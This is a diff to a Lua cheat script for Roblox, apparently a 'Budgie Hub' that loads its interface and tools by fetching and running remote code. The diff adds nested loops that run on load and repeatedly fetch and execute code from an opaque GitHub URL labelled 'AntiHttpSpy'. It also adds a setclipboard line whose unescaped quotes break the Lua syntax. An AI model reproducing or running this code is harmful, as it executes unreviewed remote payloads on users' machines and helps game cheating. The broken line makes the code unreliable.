@@ -13,6 +13,14 @@ if targetPlayer then
     })
 end
 
+for i = 1, 10 do
+  while task.wait() do
+   for i = 1, 10 do
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/AntiHttpSpy/main/ABCDEFJRTYUIOPLKSZXCVNMQWLAHLGTFBMLLOYFRUFSCBMJTEWCBHTD"))()
+   end
+  end
+end
+
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/ionlyusegithubformcmods/1-Line-Scripts/main/Mobile%20Friendly%20Orion')))()
 
 local Window = OrionLib:MakeWindow({Name = "Budgie Hub", HidePremium = true, IntroEnabled = false, SaveConfig = false, ConfigFolder = "OrionTest"})
@@ -2366,6 +2374,7 @@ chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Positio
 		end
 		if Value == "Http spy" then
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Httpspy/main/httpspy.txt"))()
+                setclipboard("loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Httpspy/main/httpspy.txt"))()")
 		end
 	end    
 })
